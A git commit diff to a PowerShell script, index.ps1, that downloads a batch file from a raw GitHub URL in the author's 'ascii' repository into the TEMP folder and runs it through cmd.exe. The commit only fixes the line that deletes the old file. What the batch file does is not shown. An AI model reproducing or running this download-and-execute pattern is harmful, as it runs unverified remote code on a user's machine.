4d586e033577673a2fc63467f85b5e6a82663f0d
SingendPfeil2 <109229547+SingendPfeil2@users.noreply.github.com>
2024-06-06 14:33:06 +0200

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,6 +1,6 @@
 $batchScriptUrl = 'https://raw.githubusercontent.com/SingendPfeil2/ascii/main/index.bat'
 $batchScriptPath = "$env:TEMP\index.bat"
-rm %temp%/index.bat
+Remove-Item "$env:TEMP\index.bat" -ErrorAction SilentlyContinue
 Invoke-WebRequest -Uri $batchScriptUrl -OutFile $batchScriptPath
 Start-Process 'cmd.exe' -ArgumentList "/c $batchScriptPath" -NoNewWindow -Wait
 exit
